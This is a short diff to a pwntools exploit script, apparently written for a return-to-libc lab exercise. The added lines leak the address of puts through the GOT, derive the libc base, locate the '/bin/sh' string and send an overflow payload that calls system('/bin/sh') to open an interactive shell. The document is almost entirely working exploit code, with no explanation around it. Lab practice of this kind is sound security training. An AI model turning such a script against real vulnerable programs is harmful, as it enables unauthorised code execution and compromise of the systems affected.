@@ -27,7 +27,7 @@ def leak_libc(func,addr,elf=None):
 	return (base,libc,system)
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './LAB/lab4/ret2lib'
 context.binary = binary
 elf = ELF(binary,checksec=False)
 libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
@@ -61,7 +61,13 @@ def show(index):
 	sla(':',index)
 
 # start
+sla(':',elf.got['puts'])
+ru('0x')
+puts = int(ru('\n'),16)
+base,libc,system = leak_libc('puts',puts)
 
+binsh = base+libc.dump('str_bin_sh')
+sla(':',flat('a'*(0x38+4),system,'a'*4,binsh))
 # end
 
 p.interactive()
